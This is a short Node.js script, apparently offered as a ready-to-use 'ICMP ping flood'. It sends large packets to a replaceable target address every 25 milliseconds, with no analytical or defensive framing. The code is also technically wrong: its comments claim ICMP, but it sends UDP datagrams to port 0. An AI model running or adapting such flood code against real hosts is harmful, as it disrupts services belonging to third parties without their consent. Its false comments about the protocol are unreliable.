const dgram = require('dgram');
const client = dgram.createSocket('udp4');

const target = 'example.com'; // Replace with target IP
const packetSize = 2048; // Increased packet size
const port = 0; // ICMP doesn't use ports
const pingPayload = Buffer.alloc(packetSize, 'PING'); // Large ICMP packet

function icmpPingFlood() {
    client.send(pingPayload, 0, pingPayload.length, port, target, (err) => {
        if (err) {
            console.error(`Error sending ICMP packet: ${err.message}`);
        } else {
            console.log(`Sent ICMP ping packet to ${target}`);
        }
    });
}

setInterval(icmpPingFlood, 25); // Send ICMP ping packets every 25ms